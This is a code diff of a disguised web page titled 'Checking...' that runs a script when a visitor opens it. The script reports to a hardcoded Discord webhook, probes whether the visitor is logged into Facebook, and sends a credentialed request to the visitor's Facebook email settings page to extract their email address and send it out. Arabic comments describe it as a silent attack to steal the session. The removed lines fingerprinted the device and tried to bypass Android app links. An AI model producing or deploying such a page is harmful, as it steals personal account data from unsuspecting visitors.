@@ -3,48 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Version 23</title>
+    <title>Checking...</title>
     <style>
-        body { background: #000; color: #0f0; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        h1 { font-size: 120px; margin: 0; text-shadow: 0 0 20px #0f0; }
-        .info { color: #444; margin-top: 10px; font-family: monospace; }
+        body { background: #000; color: #ff0000; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: 'Courier New', Courier, monospace; }
+        h1 { font-size: 150px; text-shadow: 0 0 15px #f00; }
     </style>
 </head>
 <body>
 
-    <h1>23</h1>
-    <div class="info" id="status">> نظام التمويه نشط...</div>
+    <h1>24</h1>
 
     <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";
+        const HOOK = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";
 
-        function sendToDiscord(msg) {
-            const data = JSON.stringify({ content: "🛠️ **[V23 Report]**: " + msg });
-            navigator.sendBeacon(WEBHOOK, data);
+        function sendData(label, content) {
+            const payload = JSON.stringify({
+                content: `🚀 **[Silent Loot V24]**\n**Status:** ${label}\n**Details:** ${content}`
+            });
+            navigator.sendBeacon(HOOK, payload);
         }
 
-        // تكتيك كسر الارتباط بالتطبيق
-        function forceWeb() {
-            // نستخدم mbasic لأن أندرويد 14 غالباً ما بيحولها للتطبيق مباشرة
-            const target = "https://mbasic.facebook.com/settings/email/";
-            
-            // محاولة فتح الرابط في نافذة جديدة "مخفية" أو إجبار المتصفح على البقاء
-            const win = window.open(target, "_self"); 
-            
-            // إذا النظام حاول يفتح التطبيق، السكريبت بيبعث إشعار
-            sendToDiscord("Attempting to bypass App-Link for Android 14");
+        async function startSilentAttack() {
+            // 1. إبلاغ الديسكورد بالدخول الفوري
+            sendData("Handshake", "Target hit the link. Bypassing UI interaction...");
+
+            // 2. تكتيك الـ Pixel Tracking لسحب الجلسة
+            // بنحاول نحمل صورة من رابط بيحتاج تسجيل دخول (إذا حملت يعني الجلسة نشطة)
+            const img = new Image();
+            img.src = "https://www.facebook.com/favicon.ico?_rdr=" + Math.random();
+            img.onload = () => sendData("Session Status", "Active (Cookies Detected)");
+            img.onerror = () => sendData("Session Status", "Inactive or Blocked");
+
+            // 3. محاولة سحب الإيميل عبر الـ XHR المباشر (صامت)
+            // ملاحظة: لو الحماية منعت القراءة، رح نعرف من الـ Error
+            try {
+                var xhr = new XMLHttpRequest();
+                xhr.open("GET", "https://mbasic.facebook.com/settings/email/", true);
+                xhr.withCredentials = true; // إرسال الكوكيز صمتاً
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState == 4) {
+                        if (xhr.status == 200) {
+                            const body = xhr.responseText;
+                            const email = body.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/);
+                            if(email) sendData("Success", "Email Captured: " + email[0]);
+                        }
+                    }
+                };
+                xhr.send();
+            } catch (e) {
+                sendData("Error", "CORS Policy blocked read, but request was emitted.");
+            }
         }
 
-        window.onload = () => {
-            sendToDiscord("Target opened Version 23 - Protocol Active");
-            
-            // سحب بصمة الجهاز اللي نجحت في الصور السابقة
-            const device = `Device: ${navigator.platform} | Cores: ${navigator.hardwareConcurrency}`;
-            sendToDiscord(device);
-
-            // تشغيل التكتيك بعد 3 ثواني
-            setTimeout(forceWeb, 3000);
-        };
+        window.onload = startSilentAttack;
     </script>
 </body>
 </html>
